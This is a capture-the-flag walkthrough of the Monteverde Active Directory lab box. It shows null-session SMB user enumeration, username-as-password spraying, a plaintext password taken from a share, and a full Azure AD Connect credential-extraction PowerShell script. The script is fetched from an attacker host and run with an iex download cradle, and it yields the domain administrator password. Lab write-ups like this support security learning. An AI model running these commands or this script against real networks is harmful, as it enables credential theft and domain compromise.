<img width="1097" height="146" alt="image" src="https://github.com/user-attachments/assets/36c57db9-be74-4ec9-923c-03a9052af457" />


This was a pretty straightforward box, in the initial foothold the null session was enabled on the smb and by authenticating using null session i was able to get the users. After getting the users i tried to get more info about the domain and was stuck with the data given by the ldap anonymous bind, after a while after not getting anything usefull out of ldap dump i tried to brute the users password with the users list and this gave me a user which was using his username as his password.

After authenticating to smb with the user’s creds, i found two non-default shares named azure_uploads and users$. The azure_uplods was empty so i conncted to the users$ share, there was a config file in the mhoep directory and plain text password for the same user, using this i was able to get the user shell.

# Enumeration

## Nmap

```dhall
nmap -p- --min-rate=2000 -sVC -oN nmap 10.10.10.172

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-16 14:12:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-16T14:13:10
|_  start_date: N/A
|_clock-skew: -25m51s
```

This could likely be a active directory box as it has the kerbrute and ldap service open.

I started my Enumeration with my fav. port 445

## SMB ENUM USING NetExec

```dhall
nxc smb 10.10.10.172 -u  '' -p ''  
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)                                                                                   
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\:
```

Starting with a null session i was abled to authenticate to the smb.

SInce we are authenticated let’s get the users from the smb and store it in a file named users .

```bash
nxc smb 10.10.10.172 -u  '' -p ''  --users-export users 

SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.10.10.172    445    MONTEVERDE       -Username-                    -Last PW Set-       -BadPW- -Description-  
SMB         10.10.10.172    445    MONTEVERDE       Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                    
SMB         10.10.10.172    445    MONTEVERDE       AAD_987d7f2f57d2              2020-01-02 22:53:24 0       Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.                                                                                                                        
SMB         10.10.10.172    445    MONTEVERDE       mhope                         2020-01-02 23:40:05 0        
SMB         10.10.10.172    445    MONTEVERDE       SABatchJobs                   2020-01-03 12:48:46 0        
SMB         10.10.10.172    445    MONTEVERDE       svc-ata                       2020-01-03 12:58:31 0        
SMB         10.10.10.172    445    MONTEVERDE       svc-bexec                     2020-01-03 12:59:55 0        
SMB         10.10.10.172    445    MONTEVERDE       svc-netapp                    2020-01-03 13:01:42 0        
SMB         10.10.10.172    445    MONTEVERDE       dgalanos                      2020-01-03 13:06:10 0        
SMB         10.10.10.172    445    MONTEVERDE       roleary                       2020-01-03 13:08:05 0        
SMB         10.10.10.172    445    MONTEVERDE       smorgan                       2020-01-03 13:09:21 0        
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated 10 local users: MEGABANK
SMB         10.10.10.172    445    MONTEVERDE       [*] Writing 10 local users to users

```

# Exploitation

Now that we have a users list we can try things like password spray or look for any user have pre auth enabled, we could try all this and add do more enum for password spray as any user have set there username as there password.

Well this is not exactly password spray, i just pass the passwords file as the users list we have just to see if any service or a diffrent naming account like ‘AAD_987d7f2f57d’ does also belong to any other user and they might have their password as AAD_987d7f2f57d.

```bash
nxc smb 10.10.10.172 -u users -p users 
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Now we got a hit We can connect to the smb share and enumerate for files

## SMB share as SABatchJobs

```bash
smbclient //10.10.10.172/users$ -U SABatchJobs
Password for [WORKGROUP\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off 
smb: \> mget *
getting file \mhope\azure.xml of size 1212 as mhope/azure.xml (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```

We have a azure.xml file which is most likely to be a config file for some azure related service.

We can check the files content and look for any sensitive information 

```bash
cat azure.xml 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs> 
```

We doo have a plain text password for the user mhope and let’s see if the user have reused this password as the account.

## Shell as mhope

```bash
evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> dir ../Desktop 

    Directory: C:\Users\mhope\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/16/2025   7:39 AM             34 user.txt
```

We can run gather the domain data using sharphound and put it into bloodhound and see for any intresting controls.

## Bloodhound

```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> upload SharpHound.exe
                                        
Info: Uploading /home/kali/htb/monteverde/SharpHound.exe to C:\Users\mhope\Desktop\SharpHound.exe
                                        
Data: 965288 bytes of 965288 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\mhope\Desktop> .\SharpHound.exe
2025-09-16T07:46:58.0810997-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-09-16T07:46:58.0967244-07:00|INFORMATION|Initializing SharpHound at 7:46 AM on 9/16/2025
2025-09-16T07:46:58.1748516-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for MEGABANK.LOCAL : MONTEVERDE.MEGABANK.LOCAL
2025-09-16T07:46:58.1904819-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-09-16T07:46:58.2842256-07:00|INFORMATION|Beginning LDAP search for MEGABANK.LOCAL
2025-09-16T07:46:58.3154735-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-09-16T07:46:58.3154735-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-09-16T07:47:28.6279847-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2025-09-16T07:47:42.2842280-07:00|INFORMATION|Consumers finished, closing output channel
2025-09-16T07:47:42.3154812-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2025-09-16T07:47:42.4561008-07:00|INFORMATION|Status: 121 objects finished (+121 2.75)/s -- Using 42 MB RAM
2025-09-16T07:47:42.4561008-07:00|INFORMATION|Enumeration finished in 00:00:44.1789412
2025-09-16T07:47:42.5185995-07:00|INFORMATION|Saving cache with stats: 79 ID to type mappings.
 79 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-09-16T07:47:42.5342256-07:00|INFORMATION|SharpHound Enumeration Completed at 7:47 AM on 9/16/2025! Happy Graphing!

*Evil-WinRM* PS C:\Users\mhope\Desktop> download 20250916074742_BloodHound.zip
                                        
Info: Downloading C:\Users\mhope\Desktop\20250916074742_BloodHound.zip to 20250916074742_BloodHound.zip
                                        
Info: Download successful!

```

I Loaded the data into bloodhound and tried to look for any intresting paths but found none.

Since i didnt found much on the domain itself i tired to enumerate the user privs and permissions

One thing i found intresting was the user was a part of the azure admins group.

## Shell as Administrator

Since we were the part of the azure admins group, the user mhope is able to conncet to the database the azureAD uses and ,get the encryption key to decrypt the data of the replication account and get the username and password of the account which handles the replication of the azure domain.

We can get more on deatil from [this](https://blog.xpnsec.com/azuread-connect-for-redteam/) blog.

We can get the poc powershell script from the above blog and use another way to connect to the sql server instead of the above method used in the blog since it is a bit old, i guess it doest work like that now.

```bash
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=localhost;Integrated Security=true;Initial catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

This is the final script we can use we can simply download this and execute using iex

```bash
PS C:\Users\mhope\Documents> iex(new-object net.webclient).downloadstring('http://10.10.16.13/decrypt.ps1')
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

And here we got our creds for the user administrator 

```bash
nxc smb 10.10.10.172 -u Administrator -p 'd0m@in4dminyeah!' -x 'whoami'         
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\Administrator:d0m@in4dminyeah! (Pwn3d!)
SMB         10.10.10.172    445    MONTEVERDE       [+] Executed command via wmiexec
SMB         10.10.10.172    445    MONTEVERDE       megabank\administrator
```
